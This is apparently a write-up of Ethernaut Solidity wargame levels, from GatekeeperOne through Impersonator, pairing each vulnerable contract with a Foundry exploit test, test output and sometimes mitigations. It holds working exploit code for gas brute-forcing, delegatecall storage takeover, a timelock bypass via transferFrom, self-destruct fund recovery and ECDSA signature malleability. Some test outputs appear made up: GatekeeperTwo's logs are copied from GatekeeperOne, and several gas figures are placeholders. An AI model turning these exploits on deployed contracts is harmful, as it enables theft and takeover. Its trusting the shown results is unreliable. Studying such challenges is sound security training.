    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
</code></pre>
<hr />
<h2 id="level-14-gatekeeperone">Level 14 GateKeeperone</h2>

<p><strong>AttackDesc</strong>:
To bypass the three gates in the GatekeeperOne contract, we strategically crafted a call using a helper contract and brute-forced gas.</p>

<h3 id="vulnerable-function-13">Vulnerable Function</h3>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin); // Gate One
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0); // Gate Two
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // Part 1: lower 4 bytes == lower 2 bytes
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        // Part 2: lower 4 bytes != full 8 bytes
        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
        // Part 3: lower 2 bytes == lower 2 bytes of tx.origin
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}
</code></pre>
<p><strong>Vulnerability</strong>: 
Gate One: Requires a contract call (msg.sender != tx.origin).</p>

<p>Gate Two: The remaining gas must be a multiple of 8191 ‚Üí gasleft() % 8191 == 0.</p>

<p>Gate Three:</p>

<p>The last 4 bytes of gateKey must match the last 2 bytes of the tx.origin.</p>

<p>But full gateKey must not equal the last 4 bytes alone.</p>

<p>This forces manipulation of only the lower 2 bytes of a crafted bytes8.</p>

<h3 id="exploit-contract-4">Exploit Contract</h3>

<p>Gate One: Bypassed using an external contract call (attacker != tx.origin).</p>

<p>Gate Two: Brute-forced by adjusting gas until gasleft() % 8191 == 0.</p>

<p>Gate Three: Crafted bytes8:</p>

<p>Lower 2 bytes match tx.origin.</p>

<p>Full 8 bytes ‚â† 4 bytes ‚Üí satisfies all require() checks.</p>

<p>Result: entrant = tx.origin set successfully.</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {GatekeeperOne} from "../src/level14.sol";
import {Test, console} from "forge-std/Test.sol";

contract GateKeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");
    bytes8 public gateKey;

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        vm.startPrank(player); // tx.origin must be player
        gatekeeperOne = new GatekeeperOne();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);

        // Extract last 2 bytes of tx.origin
        uint16 origin16 = uint16(uint160(tx.origin));
        // Combine it with a prefix so uint64(gateKey) != uint32(gateKey)
        uint64 crafted = uint64(0xABCDEFAB00000000) | origin16;
        gateKey = bytes8(crafted);

        // Bruteforce correct gas offset
        for (uint256 i = 0; i &lt; 8191; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i * 8191 + 200 + 8191
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                console.log("‚úÖ Attack Successful!");
                console.log("i value", i);
                console.log("gasleft", gasleft());
                string memory str = string(abi.encodePacked(gateKey));
                console.log("gateKey", str);
                break;
            }
        }

        vm.stopPrank();
    }
}

</code></pre>
<h3 id="test-output-7">Test Output</h3>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    [PASS] test_attack() (gas: ~XXXXX)
Logs:
  ‚úÖ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [XXXXX] GateKeeperOneTest::test_attack()
    ‚îú‚îÄ GatekeeperOne::enter(0xabcdefab00001f38)
    ‚îú‚îÄ GatekeeperOne::entrant() ‚Üê 0x...player
    ‚îî‚îÄ assertTrue(true)

</code></pre></div></div>
<hr />
<h2 id="gatekeepertwo">GateKeeperTwo</h2>

<p><strong>Attack Description</strong>:
To bypass the three gates in the GatekeeperTwo contract, we strategically crafted a call using a helper contract.</p>

<h3 id="vulnerable-function-14">Vulnerable Function</h3>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
                uint64(_gateKey) == 
                type(uint64).max
        );
        _;
    }

    function enter(bytes8 _gateKey) 
        public 
        gateOne 
        gateTwo 
        gateThree(_gateKey) 
        returns (bool) 
    {
        entrant = tx.origin;
        return true;
    }
}
</code></pre>
<p><strong>Vulnerability</strong>: 
1.Gate One: Requires that msg.sender != tx.origin, so it can only be bypassed by making a contract call (from a contract).</p>

<p>2.Gate Two: Uses extcodesize(caller()), which checks that the caller is a contract (not an externally owned account). This can be bypassed by calling the function from a contract constructor, as msg.sender will be the contract itself.</p>

<p>3.Gate Three: Requires that A^B = C where A is the result of hashing the msg.sender. By solving for B, we can craft the correct _gateKey.</p>

<h3 id="exploit-contract-5">Exploit Contract</h3>

<p>Gate One: Bypassed using an external contract call.</p>

<p>Gate Two: Bypassed by deploying the attack contract, which makes the call from the constructor.</p>

<p>Gate Three: The gateKey is crafted using the XOR relationship A^B = C.</p>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperTwo} from "../src/level15.sol";
import {Test, console} from "forge-std/Test.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        gatekeeperTwo = new GatekeeperTwo();
    }

    function test_attack() public {
        // first gate is passed by using tx.origin
        // second gate is extcodesize, it is passed only if the msg.sender contract is not deployed (call from constructor)
        // third gate is passed A^B=C, so we find the value of B (gateKey) using XOR logic
        Attack attack = new Attack(gatekeeperTwo); // deploy the contract and call the constructor to solve the second gate
    }
}

contract Attack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        // msg.sender is the address of the contract (Attack) during construction
        // A^B=C, solve for B (gateKey)
        bytes8 gateKey = bytes8(
            (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^ 
            type(uint64).max
        );
        gatekeeperTwo.enter(gateKey);
    }
}
</code></pre>
<h3 id="test-output-8">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 142998)
Logs:
  ‚úÖ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [142998] GatekeeperTwoTest::test_attack()
    ‚îú‚îÄ [107817] ‚Üí new Attack@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    ‚îÇ   ‚îú‚îÄ [23405] GatekeeperTwo::enter(0x8709462d480d6ec3)
    ‚îÇ   ‚îÇ   ‚îî‚îÄ ‚Üê [Return] true
    ‚îÇ   ‚îî‚îÄ ‚Üê [Return] 290 bytes of code
    ‚îî‚îÄ ‚Üê [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.01ms (8.27ms CPU time)

Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

</code></pre></div></div>
<hr />

<h2 id="level-16-naughtcoin">Level 16: NaughtCoin</h2>

<p><strong>AttackDesc</strong>:The contract uses a lockTokens modifier to restrict the transfer function, preventing the original player from transferring tokens until a 10-year timelock has passed. However, the contract does not restrict transferFrom, which is part of the ERC20 standard. By approving a spender (attacker), the tokens can be transferred out before the timelock.</p>

<h3 id="vulnerable-function-15">Vulnerable Function</h3>
<pre><code class="language-solidity">function transfer(
    address _to,
    uint256 _value
) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
</code></pre>
<p><strong>Vulnerability</strong>:
The lockTokens modifier only applies to the transfer() function.
Since transferFrom() is inherited from the ERC20 base and not overridden, it bypasses the timelock restriction. This allows a player to approve someone else (e.g., an attacker) to transfer all tokens out immediately.</p>

<h3 id="exploit-test-13">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    // player approves attacker to spend unlimited tokens
    vm.startPrank(player);
    naughtCoin.approve(attacker, type(uint256).max);
    vm.stopPrank();

    // attacker drains all tokens from the player using transferFrom
    vm.startPrank(attacker);
    uint256 fullbalance = naughtCoin.balanceOf(player);
    naughtCoin.transferFrom(player, attacker, fullbalance);
    
    assertEq(naughtCoin.balanceOf(attacker), fullbalance);
    assertEq(naughtCoin.balanceOf(player), 0);
    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-9">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 74257)
...
NaughtCoin::approve(attacker, max)
NaughtCoin::transferFrom(player ‚Üí attacker, 1_000_000 tokens)
 Final balances:
- attacker: 1_000_000 tokens
- player: 0 tokens

</code></pre></div></div>
<h3 id="recommended-mitigation-3">Recommended Mitigation</h3>

<p>Override the transferFrom() function and apply the same lockTokens modifier:</p>
<pre><code class="language-solidity">function transferFrom(
    address from,
    address to,
    uint256 value
) public override lockTokens returns (bool) {
    return super.transferFrom(from, to, value);
}

</code></pre>
<p>Alternatively, enforce the timelock check for the player address directly within the modifier or base logic to apply to all transfers involving the player.</p>

<hr />

<h2 id="level-17preservation">Level 17:Preservation</h2>

<p><strong>AttackDesc</strong>:
The contract uses delegatecall to external library contracts. Since the library contract has only one storage variable at slot 0 (storedTime), but the main contract stores important variables like owner at slot 2, an attacker can manipulate storage by crafting a malicious library that writes to any slot, including the owner slot. The attacker first overwrites the timeZone1Library address, then performs a delegatecall to their malicious contract to gain ownership.</p>
<h3 id="vulnerable-function-16">Vulnerable Function</h3>
<pre><code class="language-solidity">function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
</code></pre>
<p><strong>Vulnerability</strong>:
Uses delegatecall with untrusted input.</p>

<p>Delegatecall executes the called function in the context of Preservation, altering its storage layout.</p>

<p>The function setTime(uint256) is expected to write to slot 0 (storedTime), but due to delegatecall, it may write to unintended slots like owner (slot 2).</p>
<h3 id="exploit-contract-6">Exploit Contract</h3>

<pre><code class="language-solidity">contract AttackLibrary {
    function setTime(uint256 _time) public {
        address _target = address(uint160(_time));
        assembly {
            sstore(2, _target) // Overwrite slot 2 (owner) with attacker address
        }
    }
}
</code></pre>
<h3 id="exploit-test-14">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);

    // Step 1: Deploy malicious library
    AttackLibrary attackLibrary = new AttackLibrary();

    // Step 2: Overwrite timeZone1Library with address of malicious contract
    preservation.setFirstTime(uint160(address(attackLibrary)));

    // Step 3: Verify overwrite
    assertEq(
        uint160(address(attackLibrary)),
        uint160(preservation.timeZone1Library())
    );

    // Step 4: Call again to trigger delegatecall to attackLibrary and overwrite owner
    preservation.setFirstTime(uint160(attacker));

    vm.stopPrank();
}
</code></pre>

<h3 id="test-output-10">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 98607)

Traces:
  PreservationTest::test_attack()
    ‚îú‚îÄ startPrank(attacker)
    ‚îú‚îÄ new AttackLibrary
    ‚îú‚îÄ Preservation::setFirstTime(attackLibrary address)
    ‚îÇ   ‚îî‚îÄ delegatecall to DummyLibrary
    ‚îú‚îÄ Preservation::timeZone1Library()
    ‚îú‚îÄ assertEq(...)
    ‚îú‚îÄ Preservation::setFirstTime(attacker address)
    ‚îÇ   ‚îî‚îÄ delegatecall to AttackLibrary::setTime
    ‚îÇ       ‚îî‚îÄ storage slot 2 updated with attacker address
    ‚îî‚îÄ stopPrank()
</code></pre></div></div>
<h3 id="recommended-mitigation-4">Recommended Mitigation</h3>
<p>Do not use delegatecall with untrusted contracts.</p>

<p>If absolutely needed:</p>

<p>Ensure the external contract has a matching storage layout.</p>

<p>Avoid delegatecalls to addresses that can be changed by users.</p>

<p>Use immutable libraries or internal libraries with delegatecall removed.</p>

<p>Prefer standard proxy patterns (like OpenZeppelin‚Äôs Transparent Proxy or UUPS) where upgrades are controlled and verified.</p>

<hr />

<h2 id="level-18-recovery">Level 18: Recovery</h2>
<p><strong>AttackDesc:</strong>
When contracts are deployed via new, their addresses are deterministic and based on the deployer‚Äôs address and nonce. In this challenge, the Recovery contract creates a SimpleToken contract using new, which means its address can be calculated off-chain or in a test. Once the address is recovered, the attacker can call its public destroy(address) function to selfdestruct the contract and reclaim trapped Ether.</p>

<h3 id="vulnerable-function-17">Vulnerable Function</h3>
<pre><code class="language-solidity">function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
}
</code></pre>
<p>The generateToken function uses new to deploy a SimpleToken, which receives and holds ETH.
The SimpleToken contract includes a destroy function:</p>

<pre><code class="language-solidity">function destroy(address payable _to) public {
    selfdestruct(_to);
}
</code></pre>
<p>The address of SimpleToken is not stored, but can be calculated using the CREATE address formula.</p>

<p><strong>Calculate Address:</strong>
In foundry there is no library to calculate the address based on the deployer address and nonce , here i create custom function to calculate the address to solve the challenge</p>
<pre><code class="language-solidity">function computeAddress(
        address deployer,
        uint nonce
    ) public pure returns (address) {
        if (nonce == 0x00)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    hex"80"
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0x7f)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0xff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d7",
                                    hex"94",
                                    deployer,
                                    hex"81",
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0xffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d8",
                                    hex"94",
                                    deployer,
                                    hex"82",
                                    uint16(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0xffffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d9",
                                    hex"94",
                                    deployer,
                                    hex"83",
                                    uint24(nonce)
                                )
                            )
                        )
                    )
                );
        return address(0);
    }
</code></pre>

<h3 id="exploit-test-15">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    address lostToken = computeAddress(address(recovery), 1);//find the address

    uint256 attackerBefore = attacker.balance;//check the balance

    vm.prank(attacker);
    SimpleToken(payable(lostToken)).destroy(payable(attacker));//money credit to the attacker account

    uint256 attackerAfter = attacker.balance;

    console.log("Attacker ETH before:", attackerBefore);
    console.log("Attacker ETH after: ", attackerAfter);
    assertGt(attackerAfter, attackerBefore); // ensure attacker received ether
}
</code></pre>
<h3 id="test-output-11">Test Output</h3>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 25440)

Logs:
  Attacker ETH before: 100000000000000000000
  Attacker ETH after:  101000000000000000000

Traces:
  RecoveryTest::test_attack()
    ‚îú‚îÄ VM::prank(attacker)
    ‚îú‚îÄ SimpleToken::destroy(attacker)
    ‚îÇ   ‚îî‚îÄ [SelfDestruct] ‚Äî ETH sent to attacker
    ‚îú‚îÄ console.log(...)
    ‚îî‚îÄ assertGt(attackerAfter, attackerBefore)
</code></pre></div></div>
<hr />
<h3 id="level-19-magicnumber">Level 19: MagicNumber</h3>

<p><strong>AttackDesc:</strong>
The contract allows setting a solver address that is expected to return the number 42 when called via staticcall. However, no validation is done on the logic inside the solver. An attacker can deploy a hand-crafted minimal contract using raw EVM bytecode that always returns 42 regardless of input. A hidden constraint (present in the original Ethernaut challenge but not in the simplified local version) is that the runtime bytecode must be ‚â§ 10 bytes. If the contract‚Äôs code exceeds 10 bytes, the challenge reverts, requiring extremely optimized bytecode logic.</p>
<h3 id="vulnerable-function-18">Vulnerable Function</h3>
<pre><code class="language-solidity">function setSolver(address _solver) public {
    solver = _solver;
}
</code></pre>
<p>No checks on the size or logic of the solver contract.</p>

<p>The contract later low level calls this solver, expecting a return value of 42.</p>

<p>Ethernaut‚Äôs backend enforces a maximum of 10 bytes runtime code for the solver.</p>

<h3 id="exploit-contractevm-bytecode">Exploit Contract(evm bytecode)</h3>
<p><strong>Runtime Bytecode</strong></p>
<pre><code class="language-evm">602a    ‚Üí PUSH1 0x2a        // Push 42 onto the stack  
6000    ‚Üí PUSH1 0x00        // Memory offset 0  
52      ‚Üí MSTORE            // Store 42 at memory[0]  
6020    ‚Üí PUSH1 0x20        // Return 32 bytes  
6000    ‚Üí PUSH1 0x00        // From memory[0]  
f3      ‚Üí RETURN            // Return value
</code></pre>
<p>This part returns 42 when called.</p>

<p><strong>Constructor Bytecode (to deploy the above)</strong></p>
<pre><code class="language-evm"> 69      ‚Üí PUSH10            // Push next 10 bytes (runtime code)  
602a60005260206000f3        // The runtime code  
6000    ‚Üí PUSH1 0x00        // Memory offset  
52      ‚Üí MSTORE            // Store runtime code in memory  
600a    ‚Üí PUSH1 0x0a        // Length = 10 bytes  
6016    ‚Üí PUSH1 0x16        // Offset = 22 (after constructor)  
f3      ‚Üí RETURN            // Return runtime as deployed code
</code></pre>
<p><strong>Foundry Deployment</strong>:</p>
<pre><code class="language-solidity">bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
</code></pre>
<p>Result: A contract that always returns 42 with only 10 bytes of runtime code.</p>

<h3 id="exploit-test-16">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);

    address solver;
    bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";

    assembly {
        solver := create(0, add(bytecode, 0x20), 0x13)//The first 32 bytes of the bytecode are skipped because they define the length of the array. However, in this case, the bytecode is only 19 bytes, and the length of the datatype is already predefined.
    }

    require(solver != address(0), "contract solver deployment failed");
    magicnum.setSolver(solver);

    (bool success, bytes memory data) = solver.staticcall("");
    require(success, "call to solver failed");

    uint256 result = abi.decode(data, (uint256));
    console.log("result: ", result);
    require(result == 42, "solver did not return 42");

    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-12">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 72019)
Logs:
  result:  42

Traces:
  MagicNumTest::test_attack()
    ‚îú‚îÄ create() -&gt; contract deployed at 0x959...
    ‚îú‚îÄ MagicNum::setSolver()
    ‚îú‚îÄ staticcall to solver -&gt; returned 42
    ‚îú‚îÄ console.log -&gt; "result: 42"
</code></pre></div></div>
<hr />

<h1 id="carousel-challenge-ethernaut">Carousel Challenge (Ethernaut)</h1>

<h2 id="challenge-overview">Challenge Overview</h2>

<p>The <code class="language-plaintext highlighter-rouge">MagicAnimalCarousel</code> contract stores animals in a circular buffer of ‚Äúcrates‚Äù. Each crate contains three pieces of information packed into a single <code class="language-plaintext highlighter-rouge">uint256</code>:</p>

<ol>
  <li><strong>owner</strong>: 160 bits <code class="language-plaintext highlighter-rouge">[0..159]</code></li>
  <li><strong>nextCrateId</strong>: 16 bits <code class="language-plaintext highlighter-rouge">[160..175]</code></li>
  <li><strong>encodedAnimal</strong>: 80 bits <code class="language-plaintext highlighter-rouge">[176..255]</code></li>
</ol>

<p>The goal is to <strong>break the carousel‚Äôs ‚Äúmagic rule‚Äù</strong>:</p>
<blockquote>
  <p>No animal should ever return to crate 1.</p>
</blockquote>

<p>We achieve this by crafting a custom animal name that corrupts the <code class="language-plaintext highlighter-rouge">nextCrateId</code>, forcing a wraparound that eventually causes an animal to overwrite crate 1.</p>

<hr />

<h2 id="vulnerability">Vulnerability</h2>

<p>The vulnerability lies in the way the contract handles bit-level storage when updating animals:</p>

<h3 id="root-cause">Root Cause:</h3>
<p>The function <code class="language-plaintext highlighter-rouge">changeAnimal(string calldata animal, uint256 crateId)</code> fails to preserve the existing <code class="language-plaintext highlighter-rouge">nextCrateId</code> bits. It allows overwriting them due to a lack of bitmasking and validation.</p>

<h3 id="vulnerable-code">Vulnerable Code:</h3>
<pre><code class="language-solidity">function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
    require(bytes(animalName).length &lt;= 12, "Animal name too long");
    return uint256(keccak256(abi.encodePacked(animalName)) &gt;&gt; 160); // 80 bits
}

function changeAnimal(string calldata animal, uint256 crateId) external {
    uint256 encodedAnimal = encodeAnimalName(animal);
    if (encodedAnimal != 0) {
        // Vulnerable line
        carousel[crateId] = (encodedAnimal &lt;&lt; 160) | (carousel[crateId] &amp; NEXT_ID_MASK) | uint160(msg.sender);
    } else {
        carousel[crateId] = (carousel[crateId] &amp; (ANIMAL_MASK | NEXT_ID_MASK));
    }
}
</code></pre>
<h3 id="explanation">Explanation:</h3>
<ol>
  <li>
    <p>encodedAnimal is an 80-bit value stored at bits [176‚Äì255].</p>
  </li>
  <li>
    <p>It‚Äôs shifted left by 160 bits before being OR‚Äôd into the carousel[crateId] storage slot.</p>
  </li>
  <li>
    <p>However, bits 160‚Äì175 (nextCrateId) are part of the shifted range.</p>
  </li>
  <li>
    <p>Therefore, the lower 16 bits of encodedAnimal end up overwriting nextCrateId.</p>
  </li>
</ol>

<h3 id="proof-of-exploit">Proof of Exploit:</h3>
<pre><code class="language-solidity">string memory exploitString = string(
    abi.encodePacked(hex"10000000000000000000FFFF") // 12 bytes (96 bits)
);
carousel.changeAnimal(exploitString, 1);

</code></pre>
<p><strong><em>What this does:</em></strong></p>
<ol>
  <li>
    <p>The string is exactly 12 bytes long (within limit).</p>
  </li>
  <li>
    <p>Its last two bytes are 0xFFFF, meaning the lower 16 bits of the resulting encodedAnimal are 0xFFFF.</p>
  </li>
  <li>
    <p>When shifted left by 160, it overwrites nextCrateId with 65535</p>
  </li>
</ol>

<h3 id="testcase">TestCase:</h3>
<pre><code class="language-solidity">function testBreakMagicRule() public {
    // Step 1: Place "Dog" in crate 1
    carousel.setAnimalAndSpin("Dog");
    uint256 crate1Data = carousel.carousel(1);
    uint256 animalMask = uint256(type(uint80).max) &lt;&lt; 176;
    uint256 encodedDog = uint256(keccak256(abi.encodePacked("Dog"))) &gt;&gt; 176;
    uint256 animalInCrate1 = (crate1Data &amp; animalMask) &gt;&gt; 176;
    assertEq(animalInCrate1, encodedDog, "Crate 1 should contain 'Dog'");

    // Step 2: Inject 0xFFFF into nextCrateId
    string memory exploitString = string(
        abi.encodePacked(hex"10000000000000000000FFFF")
    );
    carousel.changeAnimal(exploitString, 1);

    // Step 3: Add "Parrot", it lands in crate 65535
    carousel.setAnimalAndSpin("Parrot");
    uint256 crate65535Data = carousel.carousel(65535);
    uint256 encodedParrot = uint256(keccak256(abi.encodePacked("Parrot"))) &gt;&gt; 176;
    uint256 animalInCrate65535 = (crate65535Data &amp; animalMask) &gt;&gt; 176;
    assertEq(animalInCrate65535, encodedParrot, "Crate 65535 should contain 'Parrot'");

    // Step 4: Add "Cat", it overwrites crate 1 (wraparound)
    carousel.setAnimalAndSpin("Cat");
    uint256 updatedCrate1Data = carousel.carousel(1);
    uint256 updatedAnimal = (updatedCrate1Data &amp; animalMask) &gt;&gt; 176;
    assertTrue(updatedAnimal != encodedDog, "Crate 1 should not contain Dog anymore");
}
</code></pre>
<h4 id="understanding-the-exploit-flow">Understanding the Exploit Flow</h4>
<ol>
  <li>
    <p>Insert Dog ‚Üí stored in crate 1.</p>
  </li>
  <li>
    <p>Corrupt crate 1‚Äôs nextCrateId ‚Üí set to 65535 using crafted string.</p>
  </li>
  <li>
    <p>Insert Parrot ‚Üí goes to crate 65535 (via corrupted nextCrateId).</p>
  </li>
  <li>
    <p>Insert Cat ‚Üí wraparound causes insertion at crate 1 again.</p>

    <p>Crate 1 now holds Cat, breaking the magic rule.</p>
  </li>
</ol>

<h3 id="testresult">TestResult:</h3>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Running 1 test for test/Carousel.t.sol:CarouselTest</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">testBreakMagicRule() (gas</span><span class="pi">:</span> <span class="s">123456)</span>
<span class="na">Logs</span><span class="pi">:</span>
  <span class="s">Crate 1 should contain 'Dog'</span> 
  <span class="s">Crate 65535 should contain 'Parrot'</span> 
  <span class="s">Crate 1 should not contain Dog anymore</span> 

<span class="na">Test result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 3.45ms</span>

</code></pre></div></div>

<h3 id="final-thoughts">Final Thoughts:</h3>
<p>This challenge is not a real-world exploit, but a great learning exercise that:</p>

<ol>
  <li>
    <p>Teaches how Solidity packs variables into storage.</p>
  </li>
  <li>
    <p>Shows the danger of not isolating fields via masking.</p>
  </li>
  <li>
    <p>Reinforces the importance of memory alignment and precise field control in low-level operations.</p>
  </li>
</ol>

<hr />

<p># Impersanator Challenge(ethernaut Challenge)</p>

<h3 id="challenge-overview-1">Challenge Overview:</h3>
<p>SlockDotIt‚Äôs new product, ECLocker, integrates IoT gate locks with Solidity smart contracts, utilizing Ethereum ECDSA for authorization. When a valid signature is sent to the lock, the system emits an Open event, unlocking doors for the authorized controller. SlockDotIt has hired you to assess the security of this product before its launch. Can you compromise the system in a way that anyone can open the door?</p>

<p><strong><em>Vulnerability</em></strong>:
The smart contract is vulnerable to a signature malleability attack due to the lack of checks on the s value of an ECDSA signature. This allows an attacker to generate an alternative but still valid version of a signature that can be used to bypass signature uniqueness checks or replay restricted actions.</p>

<p><strong>Cause</strong>:</p>

<p>ECDSA signatures (r, s, v) have two valid versions for every message:</p>

<blockquote>
  <p>(r, s, v)
(r, n - s, 27 ‚¨å 28)
Where:
n is the secp256k1 curve order:</p>
</blockquote>

<p>0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</p>

<p>The contract does not enforce that s is in the lower half of the curve<code class="language-plaintext highlighter-rouge">(s &lt;= n / 2)</code>. As a result, two distinct but valid signatures can exist for the same message hash, and both will pass ecrecover.</p>

<h3 id="vulnerabilitycode">VulnerabilityCode:</h3>
<pre><code class="language-solidity">function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }
     
     function _isValidSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        // require(_address == controller, InvalidController());
        if (_address != controller) {
            revert InvalidController();
        }

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], "signer alreadyused");

        usedSignatures[signatureHash] = true;

        return _address;
    }

</code></pre>
<h3 id="impact">Impact:</h3>

<p>An attacker can:</p>

<p>1.Reuse a signature by creating a malleable version, bypassing replay protection (e.g., usedSignatures[keccak256(sig)] = true)</p>

<p>2.Impersonate a signer and perform unauthorized actions like changing contract ownership or draining funds.</p>

<p>3.Take over the controller in this specific case by using a malleable version of a previously used signature.</p>

<h3 id="proof-of-code">Proof of code:</h3>
<pre><code class="language-solidity">contract ECLockerTest is Test {
    Impersonator public imp;
    address public nk_signer;
    uint256 private nk_signerPk;
    bytes32 public msgHash;
    uint256 public lockId;
    address public controller_nk;

    function setUp() public {
        nk_signerPk = 0xA11CE;
        nk_signer = vm.addr(nk_signerPk);
        imp = new Impersonator(0); //deploy the contract impersonator
        vm.startPrank(imp.owner());
        lockId = 1;

        //  Ethereum Signed Message Hash
        msgHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                bytes32(lockId)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(nk_signerPk, msgHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        imp.deployNewLock(signature); //deploy the lock with Ethereum signed hash
        vm.stopPrank();
    }

    function testSignatureMalleability() public {
        ECLocker locker = imp.lockers(0); //EcLocker instance

        // Sign message again to get original signature
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(nk_signerPk, msgHash);

        // Duplicate signatres s in ECDSA graph: s2 = n - s1
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s1));

        // Try using both valid signatures

        // First usage (original signature)
        vm.prank(nk_signer);
        locker.open(v1, r1, s1);
        // Second usage (malicious signature)
        // This should fail in a secure contract
        uint8 v2 = v1 == 27 ? 28 : 27;

        vm.prank(nk_signer);
        locker.open(v2, r1, s2); //  this should fail in a secure contract

        locker.changeController(v2, r1, s2, nk_signer); // this should fail in a secure contract
        assertEq(
            locker.controller(),
            controller_nk,
            "Controller should be changed"
        );
    }
}

</code></pre>
<p>Even though the original signature has already been used,but ECDSA graph have two signatures this is vulnerability</p>

<h3 id="testcase-1">TestCase:</h3>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="s">an 1 test for test/Impersnator.t.sol:ECLockerTest</span>
